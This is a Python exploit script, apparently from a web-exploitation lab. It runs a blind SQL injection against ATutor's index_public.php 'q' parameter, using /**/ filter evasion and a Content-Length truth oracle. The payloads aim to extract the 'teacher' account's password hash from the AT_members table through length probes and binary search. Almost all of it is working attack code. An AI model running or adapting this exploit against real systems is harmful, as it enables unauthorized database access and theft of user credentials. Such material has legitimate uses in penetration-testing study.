from sqli import QUERIES
from sqli import blind_query
from sqli import question
from sqli import get_length
from sqli import get_count
from sqli import binary_search
from sqli import get_string
import requests

req = lambda url: requests.get(url)
conditional_error = lambda response: int(response.headers['Content-Length']) == 180
blind_sqli_truthy = lambda url, sub_query, comment: F"{url}test') OR (select if(1=1,({sub_query}),1)){comment}"
url = "http://atutor/ATutor/mods/_standard/social/index_public.php?q="
query_encoder = lambda s: s.replace(' ','/**/')




teacher_hash_query = "select password from AT_members where login='teacher'"
# example using blind_query
ret = blind_query(
    req=req,
    sqli_truth_condition=conditional_error,
    url=url,
    base_query=blind_sqli_truthy,
    sub_query=QUERIES['MYSQL']['LENGTH_EXFIL'](teacher_hash_query, 39),
    query_encoder=query_encoder,
    comment="%23",
    debug=False
)
print(F"length of teacher has = 39? {ret}")
ret = blind_query(
    req=req,
    sqli_truth_condition=conditional_error,
    url=url,
    base_query=blind_sqli_truthy,
    sub_query=QUERIES['MYSQL']['LENGTH_EXFIL'](teacher_hash_query,40),
    query_encoder=query_encoder,
    comment="%23",
    debug=False
)
print(F"length of teacher has = 40? {ret}")

# example using question
ret = question(
    req=req,
    sqli_truth_condition=conditional_error,
    url=url,
    base_query=blind_sqli_truthy,
    sub_query=QUERIES['MYSQL']['LENGTH_EXFIL'](teacher_hash_query, 39),
    query_encoder=query_encoder,
    comment="%23",
    debug=False
)
print(F"length of teacher has = 39? {ret}")
ret = question(
    req=req,
    sqli_truth_condition=conditional_error,
    url=url,
    base_query=blind_sqli_truthy,
    sub_query=QUERIES['MYSQL']['LENGTH_EXFIL'](teacher_hash_query,40),
    query_encoder=query_encoder,
    comment="%23",
    debug=False
)
print(F"length of teacher has = 40? {ret}")
length_q= lambda sub_query,i: F"select length(({sub_query}))={i}"
'''
hash_len = get_length(
    req=req,
    sqli_truth_condition=conditional_error,
    url=url,
    base_query=blind_sqli_truthy,
    outer_query=length_q,
    inner_query=teacher_hash_query,
    query_encoder=query_encoder,
    comment="%23",
    debug=False
    )
print(F"Length of teacher hash: {hash_len}")
'''
# binary search
length_q= lambda sub_query,test,i: F"select length(({sub_query}))>{i}"
test = binary_search(
    req=req,
    sqli_truth_condition=conditional_error,
    url=url,
    base_query=blind_sqli_truthy,
    outer_query=length_q,
    inner_query=teacher_hash_query,
    query_encoder=query_encoder,
    pos=123,
    lo=1,
    hi=50,
    comment="%23",
    debug=False
)
print(F"testing bin search: {test}")
'''
teacher_hash = get_string(url=url, base_query=blind_sqli_truthy, sub_query=teacher_hash_query, response_truth_condition=conditional_error, strlen=hash_len, query_encoder=query_encoder)
'''